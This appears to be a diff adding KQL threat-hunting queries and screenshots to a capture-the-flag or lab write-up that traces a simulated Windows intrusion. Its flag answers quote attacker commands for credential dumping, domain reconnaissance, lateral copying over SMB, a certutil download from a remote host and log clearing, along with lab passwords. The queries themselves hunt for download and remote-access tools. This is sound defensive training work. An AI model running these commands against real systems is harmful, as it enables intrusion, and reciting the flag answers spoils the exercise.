@@ -393,8 +393,14 @@ EmberForgeX_CL
 
 **Flag:** `update.exe`
 ```
-
+EmberForgeX_CL
+| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
+| where EventID_s == "11"
+| where TargetFilename_s has_any ("lsass", ".dmp", "dump")
+| project TimeGenerated, Computer, Image_s, TargetFilename_s
+| order by TimeGenerated asc
 ```
+<img width="851" height="97" alt="image" src="https://github.com/user-attachments/assets/6731820c-d4d4-48ca-b40d-8c83493fef6f" />
 
 ---
 
@@ -404,8 +410,14 @@ EmberForgeX_CL
 
 **Flag:** `C:\Windows\System32\lsass.dmp`
 ```
-
+EmberForgeX_CL
+| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
+| where EventID_s == "11"
+| where Image_s has "spoolsv" or Image_s has "update"
+| project TimeGenerated, Computer, Image_s, TargetFilename_s
+| order by TimeGenerated asc
 ```
+<img width="851" height="97" alt="image" src="https://github.com/user-attachments/assets/6731820c-d4d4-48ca-b40d-8c83493fef6f" />
 
 ---
 
@@ -415,8 +427,13 @@ EmberForgeX_CL
 
 **Flag:** `net user /domain`
 ```
-
+EmberForgeX_CL
+| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
+| where CommandLine_s has_any ("net user", "Get-ADUser", "dsquery user", "net group")
+| project TimeGenerated, Computer, CommandLine_s
+| order by TimeGenerated asc
 ```
+<img width="566" height="75" alt="image" src="https://github.com/user-attachments/assets/a439dfbb-9be0-4382-a87d-dfc7d40cbbd7" />
 
 ---
 
@@ -427,8 +444,13 @@ net group "Domain Admins" /domain
 
 **Flag:** `net group "Domain Admins" /domain`
 ```
-
+EmberForgeX_CL
+| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
+| where CommandLine_s has_any ("net user", "Get-ADUser", "dsquery user", "net group")
+| project TimeGenerated, Computer, CommandLine_s
+| order by TimeGenerated desc
 ```
+<img width="718" height="70" alt="image" src="https://github.com/user-attachments/assets/a42da1a4-30f8-4814-a67f-fefaa86c912a" />
 
 ---
 
@@ -438,8 +460,13 @@ net group "Domain Admins" /domain
 
 **Flag:** `nltest /dclist:emberforge.local`
 ```
-
+EmberForgeX_CL
+| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
+| where CommandLine_s has_any ("nltest", "domain controllers", "dclist", "net group \"Domain Controllers\"")
+| project TimeGenerated, Computer, CommandLine_s
+| order by TimeGenerated asc
 ```
+<img width="620" height="70" alt="image" src="https://github.com/user-attachments/assets/49bc791f-f63b-4333-b382-50dfb35e1be5" />
 
 ---
 
@@ -449,8 +476,13 @@ net group "Domain Admins" /domain
 
 **Flag:** `cmd.exe /c "net share tools=C:\Users\Public /grant:everyone,full"`
 ```
-
+EmberForgeX_CL
+| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
+| where CommandLine_s has_any ("net share", "New-SmbShare")
+| project TimeGenerated, Computer, CommandLine_s
+| order by TimeGenerated desc 
 ```
+<img width="840" height="73" alt="image" src="https://github.com/user-attachments/assets/b9a33ead-fe43-49c5-90f7-1284ef9773f7" />
 
 ---
 
@@ -460,8 +492,13 @@ net group "Domain Admins" /domain
 
 **Flag:** `SMB`
 ```
-
+EmberForgeX_CL
+| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
+| where CommandLine_s has_any ("netsh", "firewall", "advfirewall", "New-NetFirewallRule")
+| project TimeGenerated, Computer, CommandLine_s
+| order by TimeGenerated asc
 ```
+<img width="1246" height="116" alt="image" src="https://github.com/user-attachments/assets/191904c9-8885-45d5-bb72-2696a4181fc3" />
 
 ---
 
@@ -471,8 +508,14 @@ net group "Domain Admins" /domain
 
 **Flag:** `spoolsv.exe`
 ```
-
+EmberForgeX_CL
+| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
+| where CommandLine_s has_any ("net share", "netsh", "copy")
+| where CommandLine_s has "SMB"
+| project TimeGenerated, CommandLine_s, ParentCommandLine_s
+| order by TimeGenerated asc
 ```
+<img width="997" height="77" alt="image" src="https://github.com/user-attachments/assets/54b5c1ac-e4a6-43cc-a898-a6aa4a34accc" />
 
 ---
 
@@ -482,8 +525,13 @@ net group "Domain Admins" /domain
 
 **Flag:** `cmd.exe /c copy C:\Users\Public\update.exe \\10.1.57.66\C$\Users\Public\update.exe`
 ```
-
+EmberForgeX_CL
+| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
+| where CommandLine_s has_any ("net share", "netsh", "copy")
+| project TimeGenerated, CommandLine_s, ParentCommandLine_s
+| order by TimeGenerated desc
 ```
+<img width="995" height="72" alt="image" src="https://github.com/user-attachments/assets/ab3b9038-aca4-414b-a19d-0788d5a3b514" />
 
 ---
 
@@ -493,8 +541,14 @@ net group "Domain Admins" /domain
 
 **Flag:** `certutil.exe > http://sync.cloud-endpoint.net:8080/update.exe`
 ```
-
+EmberForgeX_CL
+| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
+| where CommandLine_s has_any ("certutil", "bitsadmin", "wget", "curl", "Invoke-WebRequest", "iwr", "DownloadFile")
+| where CommandLine_s has "http"
+| project TimeGenerated, Computer, CommandLine_s
+| order by TimeGenerated asc
 ```
+<img width="1141" height="81" alt="image" src="https://github.com/user-attachments/assets/6b0300b0-c3f0-4d3a-8777-309ce0db08da" />
 
 ---
 
@@ -504,8 +558,14 @@ net group "Domain Admins" /domain
 
 **Flag:** `MzLblBFm`
 ```
-
+EmberForgeX_CL
+| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
+| where EventID_s == "13"
+| where TargetObject_s has "Services"
+| project TimeGenerated, Computer, TargetObject_s, Details_s
+| order by TimeGenerated desc
 ````
+<img width="988" height="72" alt="image" src="https://github.com/user-attachments/assets/c6047a21-d892-48a2-913e-a667235c6f34" />
 
 ---
 
@@ -515,8 +575,13 @@ net group "Domain Admins" /domain
 
 **Flag:** `whoami`
 ```
-
+EmberForgeX_CL
+| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-02-01 00:00))
+| where Raw_s has_any ("__output")
+| project TimeGenerated, Computer, CommandLine_s
+| order by TimeGenerated asc
 ```
+<img width="1207" height="80" alt="image" src="https://github.com/user-attachments/assets/a114b07b-53a6-4342-895f-e88a09f232b4" />
 
 ---
 
@@ -526,8 +591,13 @@ net group "Domain Admins" /domain
 
 **Flag:** `NTLM`
 ```
-
+EmberForgeX_CL
+| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-02-01 00:00))
+| where Raw_s has "NTLM" or Raw_s has "Kerberos"
+| project TimeGenerated, Computer, Raw_s
+| sort by TimeGenerated asc 
 ```
+<img width="1922" height="222" alt="image" src="https://github.com/user-attachments/assets/dabda001-7871-4e27-a742-a5f4eec1f734" />
 
 ---
 
@@ -537,8 +607,15 @@ net group "Domain Admins" /domain
 
 **Flag:** `whoami > vssadmin.exe`
 ```
-
+EmberForgeX_CL
+| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-02-01 00:00))
+| where Computer has "EC2AMAZ-EEU3IA2"
+| where EventID_s == "1"
+| where CommandLine_s !has "Splunk" and CommandLine_s !has "svchost" and CommandLine_s !has "WmiPrvSE" and CommandLine_s !has "taskhostw.exe"
+| project TimeGenerated, CommandLine_s, ParentCommandLine_s
+| order by TimeGenerated asc
 ```
+<img width="1027" height="98" alt="image" src="https://github.com/user-attachments/assets/e88656f3-2383-4e96-bfbe-6e01dbd39749" />
 
 ---
 
@@ -548,8 +625,15 @@ net group "Domain Admins" /domain
 
 **Flag:** `svc_backup`
 ```
-
+EmberForgeX_CL
+| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-02-01 00:00))
+| where Computer has "EC2AMAZ-EEU3IA2"
+| where EventID_s == "1"
+| where CommandLine_s !has "Splunk" and CommandLine_s !has "svchost" and CommandLine_s !has "WmiPrvSE" and CommandLine_s !has "taskhostw.exe"
+| project TimeGenerated, CommandLine_s, ParentCommandLine_s
+| order by TimeGenerated asc
 ```
+<img width="907" height="72" alt="image" src="https://github.com/user-attachments/assets/52d261f4-52e0-498a-a73c-d7ee4c594da1" />
 
 ---
 
@@ -559,8 +643,15 @@ net group "Domain Admins" /domain
 
 **Flag:** `P@ssw0rd123!`
 ```
-
+EmberForgeX_CL
+| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-02-01 00:00))
+| where Computer has "EC2AMAZ-EEU3IA2"
+| where EventID_s == "1"
+| where CommandLine_s !has "Splunk" and CommandLine_s !has "svchost" and CommandLine_s !has "WmiPrvSE" and CommandLine_s !has "taskhostw.exe"
+| project TimeGenerated, CommandLine_s, ParentCommandLine_s
+| order by TimeGenerated asc
 ```
+<img width="907" height="72" alt="image" src="https://github.com/user-attachments/assets/52d261f4-52e0-498a-a73c-d7ee4c594da1" />
 
 ---
 
@@ -570,8 +661,15 @@ net group "Domain Admins" /domain
 
 **Flag:** `Domain Admins`
 ```
-
+EmberForgeX_CL
+| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-02-01 00:00))
+| where Computer has "EC2AMAZ-EEU3IA2"
+| where EventID_s == "1"
+| where CommandLine_s !has "Splunk" and CommandLine_s !has "svchost" and CommandLine_s !has "WmiPrvSE" and CommandLine_s !has "taskhostw.exe"
+| project TimeGenerated, CommandLine_s, ParentCommandLine_s
+| order by TimeGenerated asc
 ```
+<img width="1180" height="85" alt="image" src="https://github.com/user-attachments/assets/0fa7db66-ea1f-4ad7-8490-6e45ab38b185" />
 
 ---
 
@@ -581,8 +679,15 @@ net group "Domain Admins" /domain
 
 **Flag:** `EmberForge2024!`
 ```
-
+EmberForgeX_CL
+| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-02-01 00:00))
+| where Computer has "EC2AMAZ-EEU3IA2"
+| where EventID_s == "1"
+| where CommandLine_s !has "Splunk" and CommandLine_s !has "svchost" and CommandLine_s !has "WmiPrvSE" and CommandLine_s !has "taskhostw.exe"
+| project TimeGenerated, CommandLine_s, ParentCommandLine_s
+| order by TimeGenerated asc
 ```
+<img width="1162" height="86" alt="image" src="https://github.com/user-attachments/assets/2e0e3229-dd2e-42a7-9e7a-dffea0cc0b27" />
 
 ---
 
@@ -592,8 +697,13 @@ net group "Domain Admins" /domain
 
 **Flag:** `WindowsUpdate`
 ```
-
+EmberForgeX_CL
+| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-02-01 00:00))
+| where CommandLine_s has_any ("schtasks", "New-ScheduledTask", "Register-ScheduledTask")
+| project TimeGenerated, CommandLine_s
+| order by TimeGenerated asc
 ```
+<img width="1166" height="80" alt="image" src="https://github.com/user-attachments/assets/a6802ee3-9e5e-42dd-be33-13c2f999267c" />
 
 ---
 
@@ -603,8 +713,13 @@ net group "Domain Admins" /domain
 
 **Flag:** `AnyDesk`
 ```
-
+EmberForgeX_CL
+| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-02-01 00:00))
+| where CommandLine_s has_any ("anydesk", "teamviewer", "screenconnect", "logmein", "radmin", "vnc")
+| project TimeGenerated, Computer, CommandLine_s
+| order by TimeGenerated asc
 ```
+<img width="682" height="71" alt="image" src="https://github.com/user-attachments/assets/3bccd3e2-bd70-48dc-ac8d-be733cf233b7" />
 
 ---
 
@@ -614,8 +729,13 @@ net group "Domain Admins" /domain
 
 **Flag:** `C:\ProgramData\AnyDesk\system.conf`
 ```
-
+EmberForgeX_CL
+| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-02-01 00:00))
+| where CommandLine_s has_any ("anydesk", "teamviewer", "screenconnect", "logmein", "radmin", "vnc")
+| project TimeGenerated, Computer, CommandLine_s
+| order by TimeGenerated asc
 ```
+<img width="781" height="71" alt="image" src="https://github.com/user-attachments/assets/9c795f4f-84ed-440a-89d5-75eb944f883e" />
 
 ---
 
@@ -625,8 +745,15 @@ net group "Domain Admins" /domain
 
 **Flag:** `wevtutil`
 ```
-
+EmberForgeX_CL
+| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-02-01 00:00))
+| where Computer has "EC2AMAZ-EEU3IA2"
+| where EventID_s == "1"
+| where CommandLine_s !has "Splunk" and CommandLine_s !has "svchost" and CommandLine_s !has "WmiPrvSE" and CommandLine_s !has "taskhostw.exe"
+| project TimeGenerated, CommandLine_s, ParentCommandLine_s
+| order by TimeGenerated asc
 ```
+<img width="1197" height="115" alt="image" src="https://github.com/user-attachments/assets/f81c79ce-8de3-4a96-a0fb-2e6a773ee7dc" />
 
 ---
 
@@ -636,7 +763,17 @@ net group "Domain Admins" /domain
 
 **Flag:** `Security, System`
 ```
-
+EmberForgeX_CL
+| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-02-01 00:00))
+| where Computer has "EC2AMAZ-EEU3IA2"
+| where EventID_s == "1"
+| where CommandLine_s !has "Splunk" and CommandLine_s !has "svchost" and CommandLine_s !has "WmiPrvSE" and CommandLine_s !has "taskhostw.exe"
+| project TimeGenerated, CommandLine_s, ParentCommandLine_s
+| order by TimeGenerated asc
 ```
+<img width="1197" height="115" alt="image" src="https://github.com/user-attachments/assets/f81c79ce-8de3-4a96-a0fb-2e6a773ee7dc" />
+
+---
+
 
 ---
